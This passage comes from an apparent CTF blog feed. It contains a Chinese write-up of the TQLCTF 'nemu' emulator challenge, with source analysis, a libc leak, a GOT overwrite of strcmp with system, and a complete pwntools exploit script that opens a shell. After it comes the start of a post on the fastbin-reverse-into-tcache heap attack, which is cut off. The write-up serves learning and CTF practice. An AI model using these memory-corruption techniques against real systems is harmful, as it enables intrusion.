<span class="title function_">cmd_p</span><span class="params">(<span class="type">char</span> *args)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(args == <span class="literal">NULL</span>)&#123;<span class="built_in">printf</span>(<span class="string">&quot;Please input argument\n&quot;</span>); <span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">bool</span> success = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">uint32_t</span> result = expr(args, &amp;success);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!success)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Wrong express!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%#x\n&quot;</span>,result);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// expr()</span></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">expr</span><span class="params">(<span class="type">char</span> *e, <span class="type">bool</span> *success)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// make token用于区分数字和寄存器。其中数字则转换成整型，寄存器则从寄存器中读出数据。</span></span><br><span class="line">  <span class="keyword">if</span> (!make_token(e)) &#123;</span><br><span class="line"></span><br><span class="line">    *success = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 以下是一些表达式求值</span></span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;nr_token; i++)&#123;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span>(tokens[i].type == <span class="string">&#x27;-&#x27;</span> &amp;&amp; ( i==<span class="number">0</span> || tokens[i<span class="number">-1</span>].type == <span class="string">&#x27;+&#x27;</span>\</span><br><span class="line"></span><br><span class="line">                      || tokens[i<span class="number">-1</span>].type == <span class="string">&#x27;-&#x27;</span> || tokens[i<span class="number">-1</span>].type == <span class="string">&#x27;*&#x27;</span>\</span><br><span class="line"></span><br><span class="line">                      || tokens[i<span class="number">-1</span>].type == TK_EQ || tokens[i<span class="number">-1</span>].type == TK_NQ \</span><br><span class="line"></span><br><span class="line">                      || tokens[i<span class="number">-1</span>].type == TK_AND || tokens[i<span class="number">-1</span>].type == TK_OR\</span><br><span class="line"></span><br><span class="line">                      || tokens[i<span class="number">-1</span>].type == NOT|| tokens[i<span class="number">-1</span>].type == NEG))&#123;</span><br><span class="line"></span><br><span class="line">                tokens[i].type = NEG;</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;nr_token; i++)&#123;</span><br><span class="line"></span><br><span class="line">             <span class="keyword">if</span>(tokens[i].type == <span class="string">&#x27;*&#x27;</span> &amp;&amp; ( i==<span class="number">0</span> || tokens[i<span class="number">-1</span>].type == <span class="string">&#x27;+&#x27;</span>\</span><br><span class="line"></span><br><span class="line">                         || tokens[i<span class="number">-1</span>].type == <span class="string">&#x27;-&#x27;</span> || tokens[i<span class="number">-1</span>].type == <span class="string">&#x27;*&#x27;</span>\</span><br><span class="line"></span><br><span class="line">                         || tokens[i<span class="number">-1</span>].type == TK_EQ || tokens[i<span class="number">-1</span>].type == TK_NQ \</span><br><span class="line"></span><br><span class="line">                         || tokens[i<span class="number">-1</span>].type == TK_AND || tokens[i<span class="number">-1</span>].type == TK_OR\</span><br><span class="line"></span><br><span class="line">                         || tokens[i<span class="number">-1</span>].type == NOT || tokens[i<span class="number">-1</span>].type == NEG ||tokens[i<span class="number">-1</span>].type == DEREF))&#123;</span><br><span class="line"></span><br><span class="line">                tokens[i].type = DEREF;</span><br><span class="line"></span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">      *success = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> eval(<span class="number">0</span>,nr_token<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置和取消watchpoint的函数不详细写了。似乎没什么重要的。就是实现了一个储存观察点的链表结构。</p><h2 id="cmd-set"><a href="#cmd-set" class="headerlink" title="cmd_set"></a>cmd_set</h2><p>可以用来设置内存。逻辑其实也不复杂，就是将目标地址和数据经过expr()计算后，调用之前的vaddr_write进行写入。这里似乎经过计算得到的data并没有设置大小。是否可以越过pmem越界写？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">cmd_set</span><span class="params">(<span class="type">char</span> *args)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">paddr_t</span> dest_addr;</span><br><span class="line"></span><br><span class="line">  <span class="type">uint32_t</span> data;</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> success = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(args == <span class="literal">NULL</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input argument\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//split string</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *dest_addr_str = strtok(args, <span class="string">&quot; &quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *data_str = strtok(<span class="literal">NULL</span>, <span class="string">&quot; &quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( (dest_addr_str==<span class="literal">NULL</span>) || (data_str == <span class="literal">NULL</span>))&#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;wrong argument\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dest_addr = expr(dest_addr_str, &amp;success);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!success) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Wrong express!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = expr(data_str, &amp;success);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!success) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Wrong express!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vaddr_write(dest_addr, <span class="number">4</span>, data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>个人认为漏洞还是集中在cmd_set、cmd_p这两个操作上。因为这个涉及和HOST的内存交互。也就是下面两个宏定义。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* convert the guest physical address in the guest program to host virtual address in NEMU */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> guest_to_host(p) ((void *)(pmem + (unsigned)p))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* convert the host virtual address in NEMU to guest physical address in the guest program */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> host_to_guest(p) ((paddr_t)((void *)p - (void *)pmem))</span></span><br></pre></td></tr></table></figure><p>尝试调试程序。通过以下命令开启源码调试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) dir ./nemu_source_code/nemu</span><br></pre></td></tr></table></figure><p>对比一下paddr_read的汇编和源码</p><p><img src="/2022/02/23/tqlctf-nemu/image-20220223233918362.png" alt="image-20220223233918362"></p><p><img src="/2022/02/23/tqlctf-nemu/image-20220223233716394.png" alt="image-20220223233716394"></p><p>rdi参数其实就是addr，也就是pmem中的偏移。以下0x6a3b80是pmem的地址。这里加上0x100001是寄存器rdi中的内容。</p><p><img src="/2022/02/23/tqlctf-nemu/image-20220223234032507.png" alt="image-20220223234032507"></p><p>可以看到，对于pmem的大小范围内的数据并没有限制偏移(addr)大小。因此可以用上述两操作完成越界读写。</p><h2 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h2><p>由于上述代码中限定了addr只能是无符号数字，而GOT表开始位置比0x6a3b80小很多，因此不能打印GOT表。</p><p><img src="/2022/02/23/tqlctf-nemu/image-20220224110019517.png" alt="image-20220224110019517"></p><p>但是经过调试发现，在和pmem偏移为0x8001d88位置，存在libc相关信息</p><p><img src="/2022/02/23/tqlctf-nemu/image-20220224110150166.png" alt="image-20220224110150166"></p><p>但是我们每次只能打印4字节。因此打印两遍即可。使用x指令的越界读即可完成。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">send(<span class="string">&#x27;x 0x8001d88&#x27;</span>) <span class="comment"># get part libc</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;      &#x27;</span>)</span><br><span class="line">libc_info1 = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) <span class="comment"># the low addr</span></span><br><span class="line">send(<span class="string">&#x27;x 0x8001d8c&#x27;</span>) </span><br><span class="line">io.recvuntil(<span class="string">&#x27;      &#x27;</span>)</span><br><span class="line">libc_info2 = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) <span class="comment"># the high addr</span></span><br><span class="line">libc_info = (libc_info2 &lt;&lt; <span class="number">32</span>) + (libc_info1)</span><br><span class="line">success(<span class="string">&quot;libc_info: &quot;</span> + <span class="built_in">hex</span>(libc_info))</span><br><span class="line">libc_base = libc_info - <span class="number">0x3c4ce8</span></span><br><span class="line">success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure><p>但是上述方法似乎仅在gdb连着的时候有效。还是第一次碰到这种问题。<strong>用gdb直接打开进程和用gdb.attach()打开进程结果会不一样，这里也才发现</strong>。用gdb.attach打开时，上述内容全部为0，并且0x86a5900不可访问。</p><p><img src="/2022/02/23/tqlctf-nemu/image-20220224140407445.png" alt="image-20220224140407445"></p><p>因此只能通过下面的方法，修改head指针为一个GOT地址，再打印出来。其中打印的时候调用如下函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">list_watchpoint</span><span class="params">()</span>&#123;</span><br><span class="line">    WP *head2 = head;</span><br><span class="line">    <span class="keyword">if</span>(head == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No watch pint to delete\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;NO Expr               Old Value               New Value\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(head2)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d  %-18s %#x               %#x\n&quot;</span>,head2-&gt;NO,head2-&gt;<span class="built_in">exp</span>,head2-&gt;old_val,head2-&gt;new_val);</span><br><span class="line">        head2 = head2-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于需要对内存解引用，我们要确保head2-&gt;exp是可以解引用的，并且head-&gt;next为NULL。head-&gt;next的偏移在0x4的位置，exp在0x4+0x8。</p><p><img src="/2022/02/23/tqlctf-nemu/image-20220224140205513.png" alt="image-20220224140205513"></p><p>由此，我们只需要选择0x60eff8-0x4=0x60eff4(但是经过调试，发现很奇怪还是需要再减去0x4，这里是真的不知道为什么，反正调试的方法就是看next是不是0)</p><p>使用0x60eff0输出可以得到下图的结果。可以看到打印出的就是free的libc。这样我们可以获得一个libc</p><p><img src="/2022/02/23/tqlctf-nemu/image-20220224141405879.png" alt="image-20220224141405879"></p><h2 id="写入system"><a href="#写入system" class="headerlink" title="写入system"></a>写入system</h2><p>在利用set写入的时候碰到一些问题。就是发现往上层写GOT，无符号数不允许，但是往下写hook函数，又会超过32位大小范围。到这里有点卡住不会了。</p><p>其实在调试pmem后面地址的时候也有发现，可以用pmem修改任意全局变量的地址。其中<strong>set_watchpoint</strong>的head指针也可以被改掉。</p><p><img src="/2022/02/23/tqlctf-nemu/image-20220224113640343.png" alt="image-20220224113640343"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (head == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    wp-&gt;NO = <span class="number">1</span>;</span><br><span class="line">    head = wp;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">watchpoint</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> NO;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">watchpoint</span> *<span class="title">next</span>;</span></span><br><span class="line"> <span class="type">char</span> <span class="built_in">exp</span>[<span class="number">30</span>];</span><br><span class="line"> <span class="type">uint32_t</span> old_val;</span><br><span class="line"> <span class="type">uint32_t</span> new_val;</span><br><span class="line">&#125; WP;</span><br></pre></td></tr></table></figure><p>注意到这里其实是head=wp，那么*head其实是wp-&gt;NO。这样就好办了，我们只需要设置head为某个GOT表的前面位置就行了。查看数据结构，只需要放在偏移为(-0x8+0x4)的地方即可。注意到我们只能写入到old_val地方(会检查是否能够求值，不能写入wp-&gt;exp)因此需要有一定的偏移。</p><p>然而，尝试了直接写入，因为首先不能直接写head（解引用next会导致出错）这个任意地址写也有点困难。看了wp才知道是真的有点难，利用了一段上面没有分析到的代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">WP *<span class="title function_">new_wp</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(free_ == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        assert(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//unlink</span></span><br><span class="line">    WP *temp = free_;</span><br><span class="line">    free_ = free_-&gt;next;</span><br><span class="line">    <span class="comment">//insert</span></span><br><span class="line">    temp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是当我们新建一个watch point时，nemu会先检查是不是有已经释放的，如果有就拿出来，对其进行写。似乎这里才是真正的任意地址写。而且free_也是一个全局变量</p><p><img src="/2022/02/23/tqlctf-nemu/image-20220224145004149.png" alt="image-20220224145004149"></p><p>free_就在Head前面，也可以被操控。因此把free_改成我们想要写入的地址附近(这里似乎没有什么检查)可以通过调试看出来偏移为多少的地方可以写入数据。</p><p><img src="/2022/02/23/tqlctf-nemu/image-20220224145225528.png" alt="image-20220224145225528"></p><p>当我们直接将free_写入strcmp时，可以看到如下偏移位置被写入了0xdeadbeef。因此我们将之前的位置改为-0x30即可在strcmp上写入0xdeadbeef。同时由于只能低地址写入，可以接应strcmp的高2字节，直接在后面写入system。</p><p><img src="/2022/02/23/tqlctf-nemu/image-20220224145614691.png" alt="image-20220224145614691"></p><p>如下为成功改好了的GOT</p><p><img src="/2022/02/23/tqlctf-nemu/image-20220224150010870.png" alt="image-20220224150010870"></p><p>之后直接info(/bin/sh)就能拿到一个shell</p><p><img src="/2022/02/23/tqlctf-nemu/image-20220224150252708.png" alt="image-20220224150252708"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./nemu&quot;</span></span><br><span class="line">libc_name=<span class="string">&quot;./libc-2.23.so&quot;</span></span><br><span class="line">io = process(filename)</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=ELF(libc_name)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">con</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;(nemu)&#x27;</span>)</span><br><span class="line">    io.sendline(con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">breao=<span class="literal">True</span></span>):</span><br><span class="line">    cmd= <span class="string">&quot;&quot;</span></span><br><span class="line">    cmd += <span class="string">&quot;dir /home/nicholas/Desktop/pwn/tqlctf/nemu/nemu_source_code/nemu\n&quot;</span></span><br><span class="line">    cmd +=<span class="string">&quot;b vaddr_read\n&quot;</span></span><br><span class="line">    cmd +=<span class="string">&quot;b vaddr_write\n&quot;</span></span><br><span class="line">    cmd +=<span class="string">&quot;b paddr_read\n&quot;</span></span><br><span class="line">    cmd +=<span class="string">&quot;b paddr_write\n&quot;</span></span><br><span class="line">    cmd +=<span class="string">&quot;b cmd_set\n&quot;</span></span><br><span class="line">    cmd +=<span class="string">&quot;b cmd_w\n&quot;</span></span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line">    <span class="keyword">if</span>(breao):</span><br><span class="line">        send(<span class="string">&#x27;x 0x100&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># send(&#x27;x 0x8001d88&#x27;) # get part libc</span></span><br><span class="line"><span class="comment"># io.recvuntil(&#x27;      &#x27;)</span></span><br><span class="line"><span class="comment"># libc_info1 = int(io.recvuntil(&#x27;\n&#x27;,drop=True),16) # the low addr</span></span><br><span class="line"><span class="comment"># send(&#x27;x 0x8001d8c&#x27;) </span></span><br><span class="line"><span class="comment"># io.recvuntil(&#x27;      &#x27;)</span></span><br><span class="line"><span class="comment"># libc_info2 = int(io.recvuntil(&#x27;\n&#x27;,drop=True),16) # the high addr</span></span><br><span class="line"><span class="comment"># libc_info = (libc_info2 &lt;&lt; 32) + (libc_info1)</span></span><br><span class="line"><span class="comment"># success(&quot;libc_info: &quot; + hex(libc_info))</span></span><br><span class="line"><span class="comment"># libc_base = libc_info - 0x3c4ce8</span></span><br><span class="line"><span class="comment"># success(&quot;libc_base: &quot; + hex(libc_base))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># set head to sth before GOT</span></span><br><span class="line">send(<span class="string">&#x27;set 0x8000448 0x60eff0&#x27;</span>)</span><br><span class="line"><span class="comment"># debug(False)</span></span><br><span class="line">send(<span class="string">&#x27;info w&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_info1 = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27; &#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_info2 = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">libc_info = (libc_info2&lt;&lt;<span class="number">32</span>)+libc_info1</span><br><span class="line">success(<span class="string">&quot;libc_info: &quot;</span> + <span class="built_in">hex</span>(libc_info))</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">libc_base = libc_info - <span class="number">0x084540</span></span><br><span class="line">success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment"># io.recvuntil(&#x27;0x&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">strcmp_got = <span class="number">0x000000000060f0f0</span></span><br><span class="line">system = (libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]) &amp;<span class="number">0xffffffff</span></span><br><span class="line">target_addr = strcmp_got -<span class="number">0x30</span></span><br><span class="line">send(<span class="string">&#x27;set 0x8000448 0&#x27;</span>)</span><br><span class="line"><span class="comment"># change head to strcmp&#x27;s got</span></span><br><span class="line">send(<span class="string">&#x27;set 0x8000440 0x%x&#x27;</span> % target_addr)</span><br><span class="line"><span class="comment"># change</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">send(<span class="string">&#x27;w 0x%x&#x27;</span> % system)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>总结一下：一个完全无限制的越界读写问题。但是看似简单，读写操作的时候还需要经过一些检查。很值得一做。很适合作为VM pwn的入门题目仔细分析(正好也有源码，漏洞很经典)</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastbin-reverse-into-tcache</title>
      <link href="/2022/02/23/fastbin-reverse-into-tcache/"/>
      <url>/2022/02/23/fastbin-reverse-into-tcache/</url>
      
        <content type="html"><![CDATA[<p>发现自己的基础还是薄弱。参加TQLCTF一道题也不会做，看了wp，发现需要这种攻击方法。于是才过来学。本篇包含了tcache结构图。</p><span id="more"></span><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>回想一下之前的<a href="https://nicholas-wei.github.io/2022/02/07/tcache-stashing-unlink-attack/">tcache_stashing_unlink_attack</a>，最重要的特征是calloc，需要能够越过tcache获取块。这里的fastbin-reverse-into-tcache不需要calloc，但是也和堆块被重新放入tcache紧密相关。这里主要基于2.31和how2heap学习。</p><p>我们先malloc14个堆块，放7个填满tcache。free一个victim堆块(我们可以修改bk指针的)，之后再free1到6个堆块(这里个数不太重要，可以根据题目限制free，个数只和栈上数据相关。如果我们要分配到的栈地址上<strong>偏移为0x8的位置为0(也就是NULL)那么我们只需要free1个即可。否则将会向前追溯栈上的bk位置，导致segmentation fault</strong></p><p>在how2heap中，由于栈上数据被填充成垃圾数据，free了7个堆块。下图为攻击前正常的堆块。</p><p><img src="/2022/02/23/fastbin-reverse-into-tcache/image-20220223100034348.png" alt="image-20220223100034348"></p><p>接下来，我们修改victim的fd位置为栈(注意，由于victim第一个进入fastbin，因此他被放在fastbin的末尾)。并且malloc7次，拿出来tcache中的所有堆块。如下图</p><p><img src="/2022/02/23/fastbin-reverse-into-tcache/image-20220223100459737.png" alt="image-20220223100459737"></p><p><strong>关键点在这里。此时如果我们试图malloc一个0x48的堆块，会从fastbin中取出一个，之后fastbin中剩下的堆块就会被放回到tcache（这里和tcache_stashing_unlink_attack很相似）由于放回的顺序是从fastbin头部取出，放到tcache头部，因此顺序是反的。也就是我们的栈将会被放在tcache的头部</strong>。如下图</p><p><img src="/2022/02/23/fastbin-reverse-into-tcache/image-20220223101314339.png" alt="image-20220223101314339"></p><p>由于tcache不检查大小，我们相当于完成了一次任意地址分配。</p><h2 id="要求2-31"><a href="#要求2-31" class="headerlink" title="要求2.31"></a>要求2.31</h2><ol><li>可以修改位于fastbin中chunk的bk指针</li><li>可以释放至少8个chunk，如果target地址有垃圾数据(例如栈)则需要14次分配释放</li></ol><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><ol><li><p>一个任意地址堆块的分配(任意地址写入)</p></li><li><p>写入一个堆地址(上图0x7fffab165ce0位置上被写入堆地址)</p></li></ol><h2 id="简化流程"><a href="#简化流程" class="headerlink" 